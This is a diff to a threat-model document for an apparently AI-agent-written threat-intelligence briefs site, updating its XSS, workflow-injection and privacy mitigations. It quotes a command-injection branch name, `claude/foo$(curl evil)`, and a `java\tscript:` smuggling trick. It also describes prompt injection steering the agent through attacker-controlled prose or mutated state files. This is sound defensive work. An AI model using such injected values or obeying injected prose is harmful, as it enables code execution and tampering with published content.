@@ -63,8 +63,9 @@ conditions and what controls exist to bound that behaviour.
 │                         TRUSTED                                      │
 │  ─ The git repository, as long as no unauthorised push has landed   │
 │  ─ The GitHub Actions workflows (constrained by `permissions:` block)│
-│  ─ The vendored libraries marked.js + DOMPurify (with HASHES check) │
-│  ─ The CSP delivered by index.html                                  │
+│  ─ `site/build.py` — server-side renderer + sanitiser               │
+│  ─ The vendored libraries (with HASHES check)                       │
+│  ─ The CSP delivered as a `<meta>` tag in every emitted page        │
 └──────────────────────────────────────────────────────────────────────┘
 ```
 
@@ -98,7 +99,7 @@ reintroduced IOCs, attacker-controlled prose published to defenders.
 - *CVE existence check.* Verification policy requires every CVE to resolve on NVD/MITRE.
 - *No IOCs, no rule code.* Editorial-invariant — even if the agent were tricked into wanting to include a hash, the brief structure forbids it. (An attacker who wanted the system to leak detection logic would have to defeat *both* the agent and the editorial check.)
 - *Only links from sources fetched today.* The prompt forbids citing from training data.
-- *DOMPurify on the site.* Even if attacker-controlled prose ends up in the brief, the reader's browser cannot execute injected `<script>` or `on*` handlers.
+- *Server-side sanitisation in `site/build.py`.* Even if attacker-controlled prose ends up in the brief, the build's Markdown renderer escapes raw HTML, restricts `<a href>` to a fixed scheme allowlist (`http`, `https`, `mailto`, `tel`, anchor / relative), and emits no construct that produces `<script>` or `on*=` handlers. The browser never sees attacker HTML — it sees the build's allowlisted output, with the strict CSP as a second layer.
 
 **Residual risk.** A correlated injection across two HIGH-reliability publishers (e.g., vendor PR re-published unchanged) could still slip past two-source verification because *two-source* doesn't require independence in fact, just in publisher. The verification policy notes this and asks the agent to look for genuinely independent reporting; in practice this is judgement-call.
 
@@ -209,17 +210,19 @@ personal-history map — mostly the user's own brief visit list, harmless)
 or pivot through CSP escapes.
 
 **Mitigations in place.**
-- *Markdown rendering goes through marked.js + DOMPurify.* DOMPurify is configured with `USE_PROFILES: { html: true }`, blocks `<script>`, on-handlers, `javascript:` and `data:` URIs.
-- *DOMPurify config is explicit and pinned* (see [`render.js`](../site/assets/js/render.js)`#PURIFY_CFG`). `FORBID_TAGS` adds `<form>`, `<iframe>`, `<embed>`, `<object>`, `<svg>`, `<math>`, `<style>`, `<base>`, `<meta>`, `<link>`. `ALLOWED_URI_REGEXP` restricts `href`/`src` to `https?:`, `mailto:`, `tel:`, `#`, or relative paths.
-- *Strict CSP meta tag* ([index.html](../site/index.html)) blocks inline scripts (`script-src 'self'`), restricts `connect-src` to same origin, blocks `<frame>`, `<object>`, forbids form submissions, sets `frame-ancestors 'none'` for clickjack defence.
-- *Vendored library integrity hashes* ([`HASHES`](../site/assets/vendor/HASHES)). `site/build.py` aborts on hash mismatch — catches both tampering and accidental upgrades that could introduce a vulnerability.
+- *Markdown is rendered server-side at build time by [`site/build.py`](../site/build.py).* The renderer emits HTML directly from a fixed allowlist of constructs (headings, paragraphs, lists, blockquotes, fenced code, tables, inline bold/italic/code/links, autolinks). Raw HTML from the brief is HTML-escaped, not interpreted — `<script>`, `<iframe>`, `on*=` handlers, `<style>`, `<form>` etc. cannot appear in a brief because there is no Markdown construct that emits them.
+- *Server-side URL-scheme allowlist* (`_safe_url` in `site/build.py`). Every `<a href>` value derived from brief content — Markdown links, autolinks, metadata-footer source URLs, citation links — is checked against `http://` `https://` `mailto:` `tel:` (or relative / anchor); anything else (`javascript:`, `data:`, `vbscript:`, `file:`, …) is replaced with `#` so the link becomes inert. Whitespace and ASCII control characters are stripped before the scheme check so an attacker cannot smuggle `java\tscript:` past it.
+- *Server-side path-segment allowlist* (`is_safe_path_segment`). State-file IDs (`cves_seen.json` ids, `sources.json` ids, `covered_items.json` keys, brief filenames, item slugs) are validated against `^[A-Za-z0-9._-]+$` (no `..`, no `/`, no leading `.` or `-`) before being used as a URL path or filesystem path. Prevents an LLM-mutated state file from making the build write outside `_site/` (e.g. into `prompts/`, `briefs/`, or `.github/workflows/`).
+- *RSS CDATA-break defence* (`_cdata_safe`). Even though the renderer always HTML-escapes `>`, the CDATA wrappers in the three RSS feeds defensively split any literal `]]>` across two CDATA sections so a future renderer change cannot allow XML injection out of `<content:encoded>` into the surrounding feed structure.
+- *Strict CSP meta tag* (`CSP_META` in `site/build.py`) on every emitted page. `default-src 'self'`; `script-src 'self' https://cloud.umami.is` (no inline scripts, no `'unsafe-inline'`, no `'unsafe-eval'`); `style-src 'self' 'unsafe-inline'`; `img-src 'self' data:`; `connect-src 'self' https://cloud.umami.is https://api-gateway.umami.dev`; `object-src 'none'`; `base-uri 'self'`; `form-action 'none'`; `upgrade-insecure-requests`. Note that `frame-ancestors` and `X-Frame-Options` cannot be delivered via a `<meta>` tag — clickjack defence is a residual gap on GitHub Pages, which doesn't allow custom HTTP headers.
+- *Vendored library integrity hashes* ([`HASHES`](../site/assets/vendor/HASHES)). `site/build.py` aborts on hash mismatch — catches both tampering and accidental upgrades that could introduce a vulnerability. The SHA-256 hashes are byte-for-byte verified at the start of every build.
+- *Self-check before publish.* The build's end-of-run self-check refuses to ship a tree that contains an inline `<script>` block or a Markdown-renderer placeholder leak (`\x00CODE0\x00` markers). Any such regression aborts the build with a non-zero exit code; the previous live site stays unchanged.
 
-**Residual risk.** A zero-day in DOMPurify itself. Fully mitigated only by upgrading on disclosure; the SHA-256 hashes ensure that an upgrade is a deliberate, audited event.
-
-**Implemented:** **Trusted Types** (`require-trusted-types-for 'script'; trusted-types ctibriefs-marked dompurify default`) — catches DOM XSS at sink in supporting browsers. Brief HTML flows through DOMPurify and is then assigned to `view.innerHTML` via the named `ctibriefs-marked` policy. Browsers without Trusted Types (Safari, Firefox today) skip the enforcement; DOMPurify alone provides equivalent runtime safety.
+**Residual risk.** A zero-day in `marked` / `DOMPurify`-equivalent behaviour at the renderer level (a Markdown construct that produces an unexpected HTML shape) — bounded by the small set of constructs the renderer actually supports, and by the URL-scheme allowlist that runs even after the construct is recognised. The frame-ancestors / `X-Frame-Options` gap is real but bounded: an attacker who frames the site can only see what a public reader sees.
 
 **What would strengthen further.**
-- **CI dependency-audit job** that warns when the vendored versions are behind.
+- **HTTP-header CSP** if/when the deployment moves off GitHub Pages — `frame-ancestors 'none'` is the most useful directive that requires header delivery.
+- **Renderer fuzz tests** that generate adversarial Markdown (mixed bold/italic/code/link nestings, oversize input, control characters, embedded `]]>`) and assert no `javascript:`/`data:`/`<script>` survives into the output.
 
 ---
 
@@ -238,6 +241,8 @@ App, exploitable workflow_dispatch) can land arbitrary content on `main`.
 - *Workflow is fast-forward-only.* Refuses if the branch is not a strict descendant of `main`. An attacker still needs to push a strict-descendant; trivial if they have credentials.
 - *Default `GITHUB_TOKEN` permissions are `contents: write` only.* No write access to other repos / org resources.
 - *Concurrency group* prevents racing simultaneous merges.
+- *Branch-name allowlist.* The workflow refuses any branch outside `claude/*` whose name contains characters other than `[A-Za-z0-9._/-]` — defends against shell-injection-via-branch-name into the workflow body, where the branch is a string interpolated from `github.event.inputs.branch` / `github.ref_name`.
+- *No `${{ }}` interpolation into shell.* All untrusted strings (workflow_dispatch input, ref name) are read via env vars (`env: INPUT_BRANCH: ${{ … }}`) rather than spliced into the shell-script body. A branch named `claude/foo$(curl evil)` cannot execute shell.
 
 **Residual risk.** A compromised credential is still total.
 
@@ -261,8 +266,12 @@ cannot influence on someone else's device.
 
 ### 2.8 Site supply-chain compromise (T8)
 
-**Risk.** A vendored library (marked.js or DOMPurify) is replaced with a
-malicious copy by an attacker with repo write access.
+**Risk.** A vendored library (`marked.min.js`, `purify.min.js`,
+`filter.min.js`) is replaced with a malicious copy by an attacker with
+repo write access. (`marked.min.js` and `purify.min.js` are kept
+vendored as a defensive backstop even though the live render pipeline
+is now server-side in `site/build.py`; the build's integrity check
+covers all three.)
 
 **Likelihood.** Low; bounded by [T6](#26-auto-merge-bypass-t6).
 
@@ -309,17 +318,14 @@ or session is captured and used to identify them.
 
 **Mitigations in place.**
 - *No cookies set by the site.* Verifiable with browser DevTools.
-- *No client-side telemetry script.* The site has no `<script src="//analytics.example.com/...">`. The only third-party load is the favicon (inline `data:` URI).
+- *Privacy-by-design analytics (Umami).* Aggregate counts only, no fingerprinting, no cookies, IP discarded after country lookup. Full disclosure at [`docs/analytics.md`](analytics.md).
 - *No fingerprinting libraries.*
-- *Personal history (`assets/js/personal.js`) stays in localStorage and never leaves the device.* Module honours `navigator.doNotTrack` and Global Privacy Control — when set, the module silently no-ops.
-- *No aggregate engagement signal* is collected at all (the previous repo-Traffic pipeline was removed; see § 4).
-- *Strict CSP* prevents connections to any third-party origin even if a future change accidentally added one.
+- *No on-device personal-history tracking.* The build emits no JavaScript that reads or writes `localStorage` for engagement purposes — the only `localStorage` use is the theme preference (light/dark/system, stored under `cti.briefs.theme`).
+- *Strict CSP* prevents connections to any third-party origin other than the Umami snippet/beacon endpoints.
 - *`referrer` meta set to `strict-origin-when-cross-origin`* — outbound clicks to publishers leak only the origin, not the URL path.
 - *No forms.* The site doesn't collect any input.
 
-**Residual risk.** GitHub itself sees the visitor's IP and User-Agent — the site cannot prevent that, only the data we choose to consume. We choose to consume only the aggregate counts.
-
-**Privacy-pledge document** for readers: yes, lives in the About page, surfaced from this file's section *Privacy of readers*. The site collects **no** aggregate visit data; the on-device personal history panel is the only counter and never leaves the visitor's browser.
+**Residual risk.** GitHub Pages and Umami both see the visitor's IP and User-Agent — the site cannot prevent that, only the data each choose to retain. GitHub Pages logs are not exposed to repo owners; Umami discards the IP after country lookup.
 
 ---
 
@@ -387,44 +393,33 @@ realistic pragmatic answer.
 
 ---
 
-## 4. Engagement metrics — privacy posture (on-device only)
+## 4. Engagement metrics — privacy posture
 
 ### 4.1 What we collect
 
-**Nothing on any server.** The site has no analytics scripts, no
-beacons, no cookies, no fingerprinting, and no integration with any
-third-party traffic service. There is no aggregate visit counter.
+The site uses **Umami Cloud** for aggregate visitor counts. Umami is a
+privacy-by-design analytics service: no cookies, no fingerprinting,
+IP discarded after country lookup, search-string parameters excluded
+from collection, and only a daily-rotated salted hash for unique-visitor
+counting. Full disclosure is at [`docs/analytics.md`](analytics.md) and
+on the deployed site at `/about/analytics/`.
 
-The repository previously included a workflow that pulled the GitHub
-Repo Traffic API into `state/engagement.json` and surfaced it as "repo
-views". That pipeline was removed (commit history visible in
-`git log -- state/engagement.json .github/workflows/sync-engagement.yml`)
-because the API exposes github.com repo traffic only, not GitHub Pages
-site traffic — so the metric was measuring the wrong thing for our
-deployment shape. Honest "no metric" is better than a metric labelled
-ambiguously.
+### 4.2 What restricts the analytics surface
 
-### 4.2 The personal history panel — the only "page count"
-
-[`assets/js/personal.js`](../site/assets/js/personal.js) records, in
-the visitor's own browser `localStorage` only:
-
-- Which briefs they have opened.
-- How many times each brief has been opened on this device.
-- Approximate dwell time on each brief (visibility-aware: paused on
-  tab hide, flushed on page unload).
-
-That's the entire engagement surface. Defences:
-
-- **Never leaves the device.** No fetch, no beacon, no sync — verified
-  by code inspection and by the strict CSP (`connect-src 'self'`)
-  which would block any cross-origin POST even if a future change
-  accidentally added one.
-- **Honours `navigator.doNotTrack === '1'` and `window.globalPrivacyControl`** — when either is true, the module is a complete no-op (no reads, no writes).
-- **Capped at 100 entries.** LRU-evicted by last-visit timestamp.
-- **One-click clear** in the home footer's "Your reading history" panel.
-- **No cookies, no IndexedDB, no Service Worker storage** — only
-  `localStorage` under a single named key (`cti.briefs.personal.v1`).
+- **Strict CSP.** `script-src` is restricted to `'self'` plus the
+  Umami snippet host. `connect-src` is restricted to `'self'` plus
+  the Umami beacon endpoints. No other third-party origin can run
+  code on the page or receive a beacon from it. A future change that
+  tried to add a different analytics service would have to extend
+  the CSP in the same commit, which surfaces in the git diff.
+- **Build self-check.** The build refuses to ship a tree that
+  contains an inline `<script>` block (CSP would refuse to execute
+  it anyway, but the self-check catches the regression at publish
+  time).
+- **Umami snippet present exactly once per page.** The build
+  self-check asserts the snippet appears in every emitted HTML page
+  exactly one time — neither zero (analytics broken) nor more than
+  one (duplicate beacons / debug leftovers).
 
 ### 4.3 What the agent does with engagement data
 
@@ -433,22 +428,23 @@ reads the source list, the past 7 days of briefs, `covered_items.json`,
 and `cves_seen.json`. There is no engagement input. Editorial weighting
 (deep-dive selection, Updates-to-Prior-Coverage ordering) returns to
 the verification + CH/EU nexus + novelty rules of v2.14. See
-`prompts/CHANGELOG.md` v2.18 for the rollback notes.
+`prompts/CHANGELOG.md` v2.18 for the rollback notes. Even if Umami
+exposed a back-channel API, the build pipeline would not consume it.
 
 ### 4.4 What we do *not* do
 
-- We do not embed any third-party analytics script.
-- We do not send beacons to any endpoint.
 - We do not set cookies.
 - We do not fingerprint.
 - We do not correlate visitors across sessions.
-- We do not infer geography or device.
 - We do not run any GitHub Action that calls the Repo Traffic API.
 - We do not send the visitor any personalised content.
+- We do not include UTM parameters on outbound or feed links — the
+  build's self-check refuses to publish a tree containing `?utm_…` /
+  `&utm_…`.
 
-The strict CSP (`connect-src 'self'`) blocks any future regression that
-tries to add cross-origin telemetry. The site's only network calls go
-to its own origin: the data bundle JSONs and brief markdown files.
+The strict CSP blocks any future regression that tries to add a
+different cross-origin telemetry destination without an explicit CSP
+edit in the same commit.
 
 ### 4.5 If the operator wants aggregate page counts later
 
